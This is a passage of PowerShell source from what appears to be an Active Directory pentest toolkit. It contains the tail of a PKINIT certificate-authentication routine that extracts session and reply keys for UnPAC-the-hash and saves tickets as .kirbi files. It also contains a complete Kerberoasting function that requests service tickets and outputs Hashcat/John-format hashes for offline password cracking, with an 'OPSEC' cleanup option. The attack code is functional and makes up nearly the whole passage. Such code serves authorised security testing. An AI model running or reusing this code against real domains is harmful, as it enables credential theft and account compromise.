                        137 { "PA-FX-ERROR" }
                        165 { "PA-SUPPORTED-ENCTYPES" }
                        default { "Unknown-$($_.Type)" }
                    }
                    "$paTypeName ($($_.Type))"
                }
                Write-Log "[Invoke-PKINITAuth-Native] PA-DATA types in response: $($paTypes -join ', ')"
            } else {
                Write-Log "[Invoke-PKINITAuth-Native] No PA-DATA in response"
            }

            $paPkAsRep = $asRep.PAData | Where-Object { $_.Type -eq $Script:PA_PK_AS_REP } | Select-Object -First 1

            if (-not $paPkAsRep) {
                # Provide more helpful error message based on what was received
                $errorMsg = "PA-PK-AS-REP (type 17) not found in KDC response"
                if ($asRep.PAData -and $asRep.PAData.Count -gt 0) {
                    $hasEtypeInfo2 = $asRep.PAData | Where-Object { $_.Type -eq 19 }
                    if ($hasEtypeInfo2) {
                        $errorMsg += ". KDC responded with PA-ETYPE-INFO2 indicating it expects password-based auth instead of certificate. "
                        $errorMsg += "Check: 1) Certificate has Smart Card Logon EKU (1.3.6.1.4.1.311.20.2.2) or Client Authentication EKU (1.3.6.1.5.5.7.3.2), "
                        $errorMsg += "2) CA is in AD NTAuth store, 3) UPN in certificate matches AD user"
                    }
                }
                throw $errorMsg
            }

            $dhRepInfo = ConvertFrom-PaPkAsRep -Data $paPkAsRep.Value

            if (-not $dhRepInfo.Success) {
                throw "Failed to parse PA-PK-AS-REP: $($dhRepInfo.Error)"
            }

            if (-not $dhRepInfo.DHKeyInfo -or -not $dhRepInfo.DHKeyInfo.ServerPublicKey) {
                throw "Server DH public key not found in response"
            }

            # Step 13: Calculate shared secret
            $sharedSecret = Get-DHSharedSecret -TheirPublicKey $dhRepInfo.DHKeyInfo.ServerPublicKey -MyPrivateKey $dhKeyPair.PrivateKey
            $sharedSecretBytes = ConvertTo-BigEndianBytes -Value $sharedSecret

            # Step 14: Derive session key
            $serverDHNonce = if ($dhRepInfo.ServerDHNonce) { $dhRepInfo.ServerDHNonce } else { @() }
            $sessionKey = Get-PKINITSessionKey -SharedSecret $sharedSecretBytes -ClientDHNonce $clientDHNonce -ServerDHNonce $serverDHNonce -EType $asRep.EType

            # Save the DH-derived key as AS-REP Reply Key (needed for UnPAC-the-hash PAC_CREDENTIAL_INFO decryption, KeyUsage=16)
            $asRepReplyKey = [byte[]]$sessionKey.Clone()

            # Step 15: Decrypt enc-part to get EncASRepPart

            $authTime = $null
            $startTime = $null
            $endTime = $null
            $renewTill = $null
            $ticketFlags = $null  # Raw flags from EncKDCRepPart
            $encPartSessionKey = $null  # Session key from EncKDCRepPart (should match DH-derived)

            try {
                $decryptedEncPart = Unprotect-KerberosData -CipherText $asRep.EncPart -Key $sessionKey -EType $asRep.EType -KeyUsage 3  # 3 = AS-REP encrypted part

                # Parse EncKDCRepPart to extract session key, flags, and time fields
                # EncKDCRepPart ::= SEQUENCE {
                #     key             [0] EncryptionKey,
                #     last-req        [1] LastReq,
                #     nonce           [2] UInt32,
                #     key-expiration  [3] KerberosTime OPTIONAL,
                #     flags           [4] TicketFlags,
                #     authtime        [5] KerberosTime,
                #     starttime       [6] KerberosTime OPTIONAL,
                #     endtime         [7] KerberosTime,
                #     renew-till      [8] KerberosTime OPTIONAL,
                #     srealm          [9] Realm,
                #     sname           [10] PrincipalName,
                #     caddr           [11] HostAddresses OPTIONAL
                # }
                try {
                    $root = Read-ASN1Element -Data $decryptedEncPart
                    $contentToParse = $root.Content
                    if ($root.Tag -ne 0x30) {
                        $innerSeq = Read-ASN1Element -Data $root.Content -Offset 0
                        $contentToParse = $innerSeq.Content
                    }
                    $children = Read-ASN1Children -Data $contentToParse

                    foreach ($child in $children) {
                        switch ($child.TagNumber) {
                            0 {
                                # key [0] EncryptionKey
                                # EncryptionKey ::= SEQUENCE { keytype [0] INT32, keyvalue [1] OCTET STRING }
                                try {
                                    $keySeq = Read-ASN1Element -Data $child.Content
                                    $keyChildren = Read-ASN1Children -Data $keySeq.Content
                                    foreach ($keyChild in $keyChildren) {
                                        if ($keyChild.TagNumber -eq 1) {
                                            # keyvalue [1] OCTET STRING
                                            $keyValueElement = Read-ASN1Element -Data $keyChild.Content
                                            $encPartSessionKey = $keyValueElement.Content
                                        }
                                    }
                                }
                                catch { }
                            }
                            4 {
                                # flags [4] TicketFlags (BIT STRING)
                                try {
                                    $flagsElement = Read-ASN1Element -Data $child.Content
                                    # BIT STRING: first byte is unused bits count, rest is the flags
                                    if ($flagsElement.Content.Length -ge 5) {
                                        # Skip unused bits byte, take 4 bytes of flags
                                        $ticketFlags = [byte[]]$flagsElement.Content[1..4]
                                    }
                                }
                                catch { }
                            }
                            5 {
                                # authtime [5] KerberosTime
                                $timeElement = Read-ASN1Element -Data $child.Content
                                $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                                $authTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                            }
                            6 {
                                # starttime [6] KerberosTime OPTIONAL
                                $timeElement = Read-ASN1Element -Data $child.Content
                                $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                                $startTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                            }
                            7 {
                                # endtime [7] KerberosTime
                                $timeElement = Read-ASN1Element -Data $child.Content
                                $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                                $endTime = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                            }
                            8 {
                                # renew-till [8] KerberosTime OPTIONAL
                                $timeElement = Read-ASN1Element -Data $child.Content
                                $timeString = [System.Text.Encoding]::ASCII.GetString($timeElement.Content)
                                $renewTill = [DateTime]::ParseExact($timeString, "yyyyMMddHHmmssZ", $null, [System.Globalization.DateTimeStyles]::AssumeUniversal -bor [System.Globalization.DateTimeStyles]::AdjustToUniversal)
                            }
                        }
                    }

                    # Verify session key matches (for debugging)
                    if ($encPartSessionKey) {
                        $keysMatch = $true
                        if ($encPartSessionKey.Length -ne $sessionKey.Length) {
                            $keysMatch = $false
                        } else {
                            for ($i = 0; $i -lt $sessionKey.Length; $i++) {
                                if ($sessionKey[$i] -ne $encPartSessionKey[$i]) {
                                    $keysMatch = $false
                                    break
                                }
                            }
                        }
                        if (-not $keysMatch) {
                            # This is normal behavior - the EncKDCRepPart contains the authoritative session key
                            # The DH-derived key was only used to decrypt the EncKDCRepPart
                            $sessionKey = $encPartSessionKey
                        }
                    }

                }
                catch { }
            }
            catch {
                Write-Warning "[!] Failed to decrypt AS-REP enc-part: $_"
                Write-Warning "[!] This may be a key derivation issue. Continuing with ticket..."
            }

            # Step 16: Build result
            $ticketB64 = [Convert]::ToBase64String($asRep.Ticket)
            $sessionKeyB64 = [Convert]::ToBase64String($sessionKey)

            # Optional: Save as .kirbi (KRB-CRED format with session key)
            if ($OutputKirbi) {
                if (-not $sessionKey -or $sessionKey.Length -eq 0) {
                    Write-Warning "[Invoke-PKINITAuth-Native] Cannot save kirbi: Session key not available"
                } else {
                    $krbCredBytes = Build-KRBCred -Ticket $asRep.Ticket `
                        -SessionKey $sessionKey `
                        -SessionKeyType $asRep.EType `
                        -Realm $Domain.ToUpper() `
                        -ClientName $UserName `
                        -ServerName "krbtgt" `
                        -ServerInstance $Domain.ToUpper() `
                        -StartTime $startTime `
                        -EndTime $endTime `
                        -RenewTill $renewTill

                    $exportResult = Export-adPEASFile -Path $OutputKirbi -Content $krbCredBytes -Type Binary -Force
                    if ($exportResult.Success) {
                        Write-Log "[Invoke-PKINITAuth-Native] Kirbi (KRB-CRED) saved to: $($exportResult.Path) ($($exportResult.BytesWritten) bytes)"
                    } else {
                        Write-Warning "[Invoke-PKINITAuth-Native] Failed to save kirbi: $($exportResult.Message)"
                    }
                }
            }

            return [PSCustomObject]@{
                Success = $true
                Method = "PKINIT-DH"
                UserName = $UserName
                Domain = $Domain.ToUpper()
                DomainController = $DomainController
                EncryptionType = $asRep.EType
                Ticket = $ticketB64
                SessionKey = $sessionKeyB64
                SessionKeyBytes = $sessionKey
                TicketBytes = $asRep.Ticket
                AuthTime = $authTime
                StartTime = $startTime
                EndTime = $endTime
                RenewTill = $renewTill
                TicketFlags = $ticketFlags  # Raw 4-byte flags from EncKDCRepPart
                ASRepReplyKey = $asRepReplyKey  # DH-derived key for UnPAC-the-hash (PAC_CREDENTIAL_INFO decryption)
                Message = "PKINIT authentication successful"
            }
        }
        catch {
            return [PSCustomObject]@{
                Success = $false
                Method = "PKINIT-DH"
                UserName = $UserName
                Domain = $Domain
                Error = $_.Exception.Message
                Message = "PKINIT authentication failed: $_"
            }
        }
        finally {
            # Cleanup - only dispose certificate if we created it (not if passed by caller)
            if ($CertCreatedByUs -and $Cert) {
                $Cert.Dispose()
            }
        }
    }

    end { }
}



# ----- Invoke-Kerberoast.ps1 -----

function Invoke-Kerberoast {
<#
.SYNOPSIS
    Kerberoasts a service account and extracts the TGS hash for offline cracking.

.DESCRIPTION
    This function requests a TGS ticket for a Service Principal Name (SPN) and extracts the TGS ticket hash in Hashcat/John format.

    Automatically selects the appropriate method based on authentication context:
    - Windows API (KerberosRequestorSecurityToken): When using Kerberos/SSPI auth
    - In-Memory Kerberoasting: When using SimpleBind with explicit credentials

    Supports multiple input methods:
    - Pipeline input from Get-DomainUser (recommended for bulk operations)
    - Direct SPN parameter (auto-resolves SAMAccountName via LDAP)
    - Direct SAMAccountName parameter (auto-resolves first SPN via LDAP)
    - Both SAMAccountName and SPN (no LDAP lookup needed)

    Encryption Types:
    - etype 23 (RC4-HMAC) = CRITICAL - Very fast to crack
    - etype 17 (AES128) = HIGH - Harder to crack
    - etype 18 (AES256) = MEDIUM - Strongest encryption

    Hash Format:
    - Output: $krb5tgs$etype$*user$realm$spn*$checksum$encrypted_part
    - Compatible with Hashcat (mode 13100 for RC4, 19700 for AES)
    - Compatible with John the Ripper

.PARAMETER InputObject
    A user object from Get-DomainUser (pipeline input). Must have sAMAccountName and servicePrincipalName properties.

.PARAMETER SAMAccountName
    The SAMAccountName of the service account. If SPN is not provided, the first SPN will be looked up via LDAP.

.PARAMETER SPN
    The Service Principal Name to request a TGS ticket for. If SAMAccountName is not provided, the account owning this SPN will be looked up via LDAP.

.PARAMETER Domain
    Target domain (optional, uses current domain if not specified)

.PARAMETER Server
    Domain Controller to query (optional, uses auto-discovery if not specified)

.PARAMETER Credential
    PSCredential object for authentication (optional, uses current user if not specified)

.PARAMETER Username
    Username for authentication. Must be used together with -Password.

.PARAMETER Password
    Password for authentication. Must be used together with -Username.

.PARAMETER CleanupTickets
    If specified, purges the requested ticket from cache after analysis (OPSEC).
    Only applies when using Windows API method.

.EXAMPLE
    # Pipeline from Get-DomainUser (recommended for bulk)
    Get-DomainUser -SPN | Invoke-Kerberoast

.EXAMPLE
    # Single account by SAMAccountName (looks up SPN)
    Invoke-Kerberoast -SAMAccountName "svc_sql"

.EXAMPLE
    # Single SPN (looks up SAMAccountName)
    Invoke-Kerberoast -SPN "MSSQLSvc/sql01.contoso.com:1433"

.EXAMPLE
    # Both parameters (no LDAP lookup)
    Invoke-Kerberoast -SAMAccountName "svc_sql" -SPN "MSSQLSvc/sql01.contoso.com:1433"

.EXAMPLE
    # With explicit credentials (forces in-memory method)
    Invoke-Kerberoast -SAMAccountName "svc_sql" -Credential (Get-Credential)

.OUTPUTS
    PSCustomObject with test results including encryption type, severity, and hash.

.NOTES
    Author: Alexander Sturz (@_61106960_)
    Requires: Kerberos-Crypto.ps1 must be loaded (provides $Script:KERBEROS_ENCRYPTION_TYPES)
#>
    [CmdletBinding(DefaultParameterSetName='ByParameters')]
    param(
        [Parameter(Mandatory=$true, ValueFromPipeline=$true, ParameterSetName='ByPipeline')]
        [PSCustomObject]$InputObject,

        [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
        [string]$SAMAccountName,

        [Parameter(Mandatory=$false, ParameterSetName='ByParameters')]
        [string]$SPN,

        [Parameter(Mandatory=$false)]
        [string]$Domain,

        [Parameter(Mandatory=$false)]
        [string]$Server,

        [Parameter(Mandatory=$false)]
        [System.Management.Automation.PSCredential]$Credential,

        [Parameter(Mandatory=$false)]
        [string]$Username,

        [Parameter(Mandatory=$false)]
        [string]$Password,

        [Parameter(Mandatory=$false)]
        [switch]$CleanupTickets
    )

    begin {
        Write-Log "[Invoke-Kerberoast] Starting Kerberoast"

        # Validate dependency: $Script:KERBEROS_ENCRYPTION_TYPES must be defined
        if (-not $Script:KERBEROS_ENCRYPTION_TYPES) {
            Write-Error "[Invoke-Kerberoast] Required dependency missing: `$Script:KERBEROS_ENCRYPTION_TYPES not defined. Ensure Kerberos-Crypto.ps1 is loaded."
            return
        }

        # Build credential parameters for LDAP lookups, this is needed when running standalone without an active session
        $Script:KerberoastCredParams = @{}
        if ($Domain) { $Script:KerberoastCredParams['Domain'] = $Domain }
        if ($Server) { $Script:KerberoastCredParams['Server'] = $Server }
        if ($Credential) {
            $Script:KerberoastCredParams['Credential'] = $Credential
        } elseif ($Username -and $Password) {
            # Build PSCredential from Username/Password
            $securePassword = ConvertTo-SecureString -String $Password -AsPlainText -Force
            $Script:KerberoastCredParams['Credential'] = New-Object System.Management.Automation.PSCredential($Username, $securePassword)
        }

        # Determine Kerberoasting method based on authentication context
        # Windows API (KerberosRequestorSecurityToken): Requires valid TGT in ticket cache
        # In-Memory (own Kerberos stack): Uses credentials to request TGT + TGS on-the-fly
        $Script:UseInMemoryMethod = $false

        # If explicit credentials provided, use in-memory method
        if ($Credential -or ($Username -and $Password)) {
            $Script:UseInMemoryMethod = $true
            Write-Log "[Invoke-Kerberoast] Explicit credentials provided - using in-memory method"
        }
        # Check LDAP session auth method - non-Kerberos methods have no TGT in cache
        elseif ($Script:LDAPContext -and $Script:LDAPContext['AuthMethod']) {
            $sessionAuthMethod = $Script:LDAPContext['AuthMethod']
            # Only Windows API works for Kerberos-based auth (TGT is in the ticket cache)
            # For all other methods (SimpleBind, NTLM Impersonation), use in-memory if credentials available
            if ($sessionAuthMethod -in @('Kerberos', 'WindowsSSPI')) {
                Write-Log "[Invoke-Kerberoast] Kerberos auth detected ($sessionAuthMethod) - using Windows API method"
            }
            elseif ($Script:LDAPContext['Credential']) {
                $Script:UseInMemoryMethod = $true
                Write-Log "[Invoke-Kerberoast] Non-Kerberos auth ($sessionAuthMethod) with credentials - using in-memory method"
            }
            else {
                Write-Log "[Invoke-Kerberoast] Non-Kerberos auth ($sessionAuthMethod) without credentials - using Windows API method (may fail)"
            }
        }
        else {
            Write-Log "[Invoke-Kerberoast] No session info - using Windows Kerberos API method"
        }

        # Helper function to resolve SAMAccountName from SPN
         function Resolve-SPNOwner {
            param([string]$SPN)

            Write-Log "[Invoke-Kerberoast] Looking up SAMAccountName for SPN: $SPN"
            $user = @(Get-DomainUser -LDAPFilter "(servicePrincipalName=$SPN)" -Properties sAMAccountName @Script:KerberoastCredParams)[0]
            if ($user) {
                return $user.sAMAccountName
            }
            return $null
        }

        # Helper function to resolve first SPN from SAMAccountName
          function Resolve-UserSPN {
            param([string]$SAMAccountName)

            Write-Log "[Invoke-Kerberoast] Looking up SPNs for user: $SAMAccountName"
            $user = @(Get-DomainUser -Identity $SAMAccountName -Properties servicePrincipalName @Script:KerberoastCredParams)[0]
            if ($user -and $user.servicePrincipalName) {
                $spns = @($user.servicePrincipalName)
                return $spns[0]
            }
            return $null
        }

        if (-not $Script:UseInMemoryMethod) {
            # Add System.IdentityModel for Kerberos ticket requests
            try {
                Add-Type -AssemblyName System.IdentityModel -ErrorAction Stop
            } catch {
                Write-Error "[Invoke-Kerberoast] Failed to load System.IdentityModel assembly: $_"
                return
            }
        }
    }

    process {
        # Resolve effective SAMAccountName and SPN based on input method
        $effectiveSAMAccountName = $null
        $effectiveSPN = $null

        if ($PSCmdlet.ParameterSetName -eq 'ByPipeline') {
            # Pipeline input
            if (-not $InputObject.sAMAccountName) {
                Write-Warning "[Invoke-Kerberoast] Pipeline object missing sAMAccountName property"
                return
            }
            if (-not $InputObject.servicePrincipalName) {
                Write-Warning "[Invoke-Kerberoast] Pipeline object missing servicePrincipalName property"
                return
            }

            $effectiveSAMAccountName = $InputObject.sAMAccountName
            $spns = @($InputObject.servicePrincipalName)
            $effectiveSPN = $spns[0]

            Write-Log "[Invoke-Kerberoast] Pipeline input: $effectiveSAMAccountName with SPN $effectiveSPN"
        }
        else {
            # ByParameters - resolve missing values
            if ($SAMAccountName -and $SPN) {
                 $effectiveSAMAccountName = $SAMAccountName
                $effectiveSPN = $SPN
            }
            elseif ($SPN -and -not $SAMAccountName) {
                # Only SPN provided - lookup SAMAccountName
                $effectiveSPN = $SPN
                $effectiveSAMAccountName = Resolve-SPNOwner -SPN $SPN
                if (-not $effectiveSAMAccountName) {
                    Write-Warning "[Invoke-Kerberoast] Could not find account owning SPN: $SPN"
                    return [PSCustomObject]@{
                        SAMAccountName = "Unknown"
                        SPN = $SPN
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = $null
                        Severity = $null
                        HashcatMode = $null
                        Hash = $null
                        Error = "Could not resolve SAMAccountName for SPN"
                    }
                }
                Write-Log "[Invoke-Kerberoast] Resolved SAMAccountName '$effectiveSAMAccountName' for SPN '$SPN'"
            }
            elseif ($SAMAccountName -and -not $SPN) {
                # Only SAMAccountName provided - lookup first SPN
                $effectiveSAMAccountName = $SAMAccountName
                $effectiveSPN = Resolve-UserSPN -SAMAccountName $SAMAccountName
                if (-not $effectiveSPN) {
                    Write-Warning "[Invoke-Kerberoast] Account '$SAMAccountName' has no SPNs"
                    return [PSCustomObject]@{
                        SAMAccountName = $SAMAccountName
                        SPN = "None"
                        Success = $false
                        EncryptionType = $null
                        EncryptionTypeName = $null
                        Severity = $null
                        HashcatMode = $null
                        Hash = $null
                        Error = "Account has no servicePrincipalName"
                    }
                }
                Write-Log "[Invoke-Kerberoast] Using first SPN '$effectiveSPN' for account '$SAMAccountName'"
            }
            else {
                Write-Error "[Invoke-Kerberoast] Either -SAMAccountName, -SPN, or pipeline input required"
                return
            }
        }

        Write-Log "[Invoke-Kerberoast] Kerberoasting: $effectiveSAMAccountName / $effectiveSPN"

        # Route to appropriate method
        if ($Script:UseInMemoryMethod) {
            return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Credential -Username $Username -Password $Password
        }
        else {
            $apiResult = Invoke-KerberoastWindowsAPI -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -CleanupTickets:$CleanupTickets

            # If Windows API failed with a credentials/NetworkCredentials error AND the session has
            # stored credentials (e.g. PTT session from non-domain-member), fall back to in-memory method
            if (-not $apiResult.Success -and $apiResult.Error -match 'NetworkCredentials|TGT in cache|Re-authenticate') {
                if ($Script:LDAPContext -and $Script:LDAPContext['Credential']) {
                    Write-Log "[Invoke-Kerberoast] Windows API failed (NetworkCredentials), falling back to in-memory method using session credentials"
                    return Invoke-KerberoastInMemory -SAMAccountName $effectiveSAMAccountName -SPN $effectiveSPN -Domain $Domain -Server $Server -Credential $Script:LDAPContext['Credential']
                }
            }

            return $apiResult
        }
    }

    end {
        Write-Log "[Invoke-Kerberoast] Kerberoast completed"
    }
}

#region Internal: Windows API Method
function Invoke-KerberoastWindowsAPI {
    param(
        [string]$SAMAccountName,
        [string]$SPN,
        [switch]$CleanupTickets
    )

    Write-Log "[Invoke-KerberoastWindowsAPI] Using Windows Kerberos API for $SPN"

    try {
        # Step 1: Request TGS ticket using System.IdentityModel and extract it directly
        # The KerberosRequestorSecurityToken contains the ticket - we extract it via GetRequest()
        Write-Log "[Invoke-KerberoastWindowsAPI] Requesting TGS ticket for $SPN"

        $KerberosToken = $null
        $TicketBytes = $null

        try {
            $KerberosToken = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $SPN

            # Extract the raw ticket from the token using GetRequest()
            # GetRequest() returns the AP-REQ which contains the ticket
            $ApReqBytes = $KerberosToken.GetRequest()

            if ($ApReqBytes -and $ApReqBytes.Length -gt 0) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Got AP-REQ of $($ApReqBytes.Length) bytes"

                # Parse AP-REQ to extract the Ticket
                # AP-REQ ::= [APPLICATION 14] SEQUENCE { ... ticket [3] Ticket ... }
                $TicketBytes = Get-TicketFromApReq -ApReqBytes $ApReqBytes

                if (-not $TicketBytes) {
                    throw "Failed to extract Ticket from AP-REQ"
                }

                Write-Log "[Invoke-KerberoastWindowsAPI] Extracted ticket of $($TicketBytes.Length) bytes from AP-REQ"
            } else {
                throw "GetRequest() returned empty AP-REQ"
            }
        } catch {
            Write-Log "[Invoke-KerberoastWindowsAPI] Failed to request/extract ticket: $_"

            # Analyze error to provide user-friendly message
            $errorMessage = $_.Exception.Message
            $innerMessage = if ($_.Exception.InnerException) { $_.Exception.InnerException.Message } else { $null }
            $fullError = if ($innerMessage) { "$errorMessage - $innerMessage" } else { $errorMessage }

            # Check for common error patterns and provide helpful guidance
            $userFriendlyError = $null

            # No TGT in cache (most common after klist purge or expired tickets)
            if ($fullError -match 'NetworkCredentials|unable to create.*Kerberos credential|No credentials are available') {
                $userFriendlyError = "No valid Kerberos TGT in cache. Re-authenticate with Connect-adPEAS or use -Credential parameter for in-memory Kerberoasting."
            }
            # Target principal not found (SPN doesn't exist)
            elseif ($fullError -match 'target principal name is incorrect|cannot find') {
                $userFriendlyError = "SPN not found or unreachable: $SPN"
            }
            # KDC unreachable
            elseif ($fullError -match 'KDC.*unavailable|cannot contact|network path') {
                $userFriendlyError = "Cannot contact KDC. Check network connectivity and DNS."
            }

            return [PSCustomObject]@{
                SAMAccountName = $SAMAccountName
                SPN = $SPN
                Success = $false
                EncryptionType = $null
                EncryptionTypeName = $null
                Severity = $null
                HashcatMode = $null
                Hash = $null
                Error = if ($userFriendlyError) { $userFriendlyError } else { "TGS request failed: $fullError" }
            }
        }

        # Step 2: Parse ticket to extract EncryptionType and hash
        $EncryptionType = $null
        $EncryptionTypeName = $null
        $Severity = $null
        $HashcatMode = $null
        $TicketHash = $null
        $TicketFound = $false

        # Get realm name with proper null check and uppercase for Kerberos
        $RealmName = "UNKNOWN"
        if ($Script:LDAPContext -and $Script:LDAPContext.distinguishedName) {
            $RealmName = ($Script:LDAPContext.distinguishedName -replace 'DC=','' -replace ',','.').ToUpper()
        } elseif ($Script:LDAPContext -and $Script:LDAPContext.Domain) {
            $RealmName = $Script:LDAPContext.Domain.ToUpper()
        }

        if ($TicketBytes -and $TicketBytes.Length -gt 0) {
            $TicketFound = $true

            # Extract EncryptionType from the ASN.1-encoded ticket
            $EncryptionType = Get-EncryptionTypeFromTicket -TicketBytes $TicketBytes

            if ($EncryptionType) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Extracted etype $EncryptionType from ticket ASN.1"

                # Cast to [int] for hashtable lookup
                $etypeInt = [int]$EncryptionType
                if ($Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey($etypeInt)) {
                    $EncryptionTypeName = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Name
                    $Severity = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].Severity
                    $HashcatMode = $Script:KERBEROS_ENCRYPTION_TYPES[$etypeInt].HashcatMode
                } else {
                    $EncryptionTypeName = "Unknown (etype $etypeInt)"
                    $Severity = "Unknown"
                }
            } else {
                Write-Log "[Invoke-KerberoastWindowsAPI] Could not extract etype from ticket"
            }

            # Extract hash using centralized function
            $TicketHash = Get-KerberosTicketHash -TicketBytes $TicketBytes -EncryptionType $EncryptionType -UserName $SAMAccountName -Realm $RealmName -SPN $SPN -TicketType "TGS"

            if ($TicketHash) {
                Write-Log "[Invoke-KerberoastWindowsAPI] Successfully extracted hash (length: $($TicketHash.Length) chars)"
            }
        }

        # Build result
        $Result = [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $TicketFound
            EncryptionType = $EncryptionType
            EncryptionTypeName = $EncryptionTypeName
            Severity = $Severity
            HashcatMode = $HashcatMode
            Hash = $TicketHash
            Error = if (-not $TicketFound) { "Failed to extract ticket" } else { $null }
        }

        # Add description if available
        if ($EncryptionType -and $Script:KERBEROS_ENCRYPTION_TYPES.ContainsKey([int]$EncryptionType)) {
            $Result | Add-Member -NotePropertyName "Description" -NotePropertyValue $Script:KERBEROS_ENCRYPTION_TYPES[[int]$EncryptionType].Description
        }

        # Optional: Cleanup of requested ticket (OPSEC)
        if ($CleanupTickets) {
            Write-Log "[Invoke-KerberoastWindowsAPI] CleanupTickets requested"
            Write-Warning "[Invoke-Kerberoast] CleanupTickets requested but selective deletion not supported by klist. Use 'klist purge' manually if full cleanup is intended."
        }

        return $Result

    } catch {
        Write-Log "[Invoke-KerberoastWindowsAPI] Error testing SPN $SPN : $_"
        return [PSCustomObject]@{
            SAMAccountName = $SAMAccountName
            SPN = $SPN
            Success = $false
            EncryptionType = $null
            EncryptionTypeName = $null
            Severity = $null
            HashcatMode = $null
            Hash = $null
            Error = $_.Exception.Message
        }
    }
}

# Helper function to extract Ticket from GSS-API wrapped AP-REQ or raw AP-REQ
function Get-TicketFromApReq {
    param([byte[]]$ApReqBytes)

    try {
        # KerberosRequestorSecurityToken.GetRequest() returns a GSS-API InitialContextToken
        # Structure: [APPLICATION 0] SEQUENCE { OID, AP-REQ }
        # The AP-REQ is: [APPLICATION 14] SEQUENCE { pvno, msg-type, ap-options, ticket, authenticator }

        $offset = 0

        # Check if this is GSS-API wrapped (0x60 = APPLICATION 0)
        if ($ApReqBytes[$offset] -eq 0x60) {
            Write-Log "[Get-TicketFromApReq] Detected GSS-API wrapper (0x60)"
            $offset++

            # Skip GSS-API APPLICATION 0 length
            if ($ApReqBytes[$offset] -band 0x80) {
                $lenBytes = $ApReqBytes[$offset] -band 0x7F
                $offset += 1 + $lenBytes
            } else {
                $offset++
            }

            # Skip OID (0x06 = OBJECT IDENTIFIER for Kerberos: 1.2.840.113554.1.2.2)
            if ($ApReqBytes[$offset] -eq 0x06) {
                $offset++
                $oidLen = $ApReqBytes[$offset]
                $offset += 1 + $oidLen
                Write-Log "[Get-TicketFromApReq] Skipped OID ($oidLen bytes)"
            }

            # Now we should be at the AP-REQ token type (0x01 0x00 for AP-REQ in GSS-API)
            # Some implementations have a 2-byte token type prefix
            if ($offset + 2 -lt $ApReqBytes.Length -and $ApReqBytes[$offset] -eq 0x01 -and $ApReqBytes[$offset + 1] -eq 0x00) {
                $offset += 2
                Write-Log "[Get-TicketFromApReq] Skipped GSS-API token type (01 00)"
            }
        }

        # Now we should be at the AP-REQ [APPLICATION 14] (0x6E)
        if ($ApReqBytes[$offset] -ne 0x6E) {
            Write-Log "[Get-TicketFromApReq] Expected AP-REQ (0x6E), got 0x$($ApReqBytes[$offset].ToString('X2')) at offset $offset"
            return $null
        }

        Write-Log "[Get-TicketFromApReq] Found AP-REQ at offset $offset"
        $offset++

        # Skip AP-REQ APPLICATION length
        if ($ApReqBytes[$offset] -band 0x80) {
            $lenBytes = $ApReqBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Now at SEQUENCE (0x30)
        if ($ApReqBytes[$offset] -ne 0x30) {
            Write-Log "[Get-TicketFromApReq] Expected SEQUENCE after AP-REQ tag"
            return $null
        }
        $offset++

        # Skip SEQUENCE length
        if ($ApReqBytes[$offset] -band 0x80) {
            $lenBytes = $ApReqBytes[$offset] -band 0x7F
            $offset += 1 + $lenBytes
        } else {
            $offset++
        }

        # Search for context tag [3] (0xA3) which contains the ticket
        while ($offset -lt $ApReqBytes.Length - 10) {
            $tag = $ApReqBytes[$offset]

            if ($tag -eq 0xA3) {
                # Found ticket context tag [3]
                $offset++

                # Read context tag length
                $ticketWrapperLen = 0
                if ($ApReqBytes[$offset] -band 0x80) {
                    $lenBytes = $ApReqBytes[$offset] -band 0x7F
                    $offset++
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        $ticketWrapperLen = ($ticketWrapperLen -shl 8) -bor $ApReqBytes[$offset + $i]
                    }
                    $offset += $lenBytes
                } else {
                    $ticketWrapperLen = $ApReqBytes[$offset]
                    $offset++
                }

                # The content is the Ticket structure starting with [APPLICATION 1] (0x61)
                if ($ApReqBytes[$offset] -eq 0x61) {
                    # Copy the entire Ticket structure
                    $ticketBytes = New-Object byte[] $ticketWrapperLen
                    [Array]::Copy($ApReqBytes, $offset, $ticketBytes, 0, $ticketWrapperLen)
                    Write-Log "[Get-TicketFromApReq] Extracted Ticket ($ticketWrapperLen bytes)"
                    return $ticketBytes
                } else {
                    Write-Log "[Get-TicketFromApReq] Expected Ticket (0x61), got 0x$($ApReqBytes[$offset].ToString('X2'))"
                    return $null
                }
            }

            # Skip this element and move to next
            $offset++
            if ($offset -lt $ApReqBytes.Length) {
                $elementLen = 0
                if ($ApReqBytes[$offset] -band 0x80) {
                    $lenBytes = $ApReqBytes[$offset] -band 0x7F
                    $offset++
                    for ($i = 0; $i -lt $lenBytes; $i++) {
                        if ($offset + $i -lt $ApReqBytes.Length) {
                            $elementLen = ($elementLen -shl 8) -bor $ApReqBytes[$offset + $i]
                        }
                    }
                    $offset += $lenBytes + $elementLen
                } else {
                    $elementLen = $ApReqBytes[$offset]
                    $offset += 1 + $elementLen
                }
            }
        }

        Write-Log "[Get-TicketFromApReq] Ticket not found in AP-REQ"
        return $null
    }
    catch {
        Write-Log "[Get-TicketFromApReq] Error parsing: $_"
        return $null
    }
}

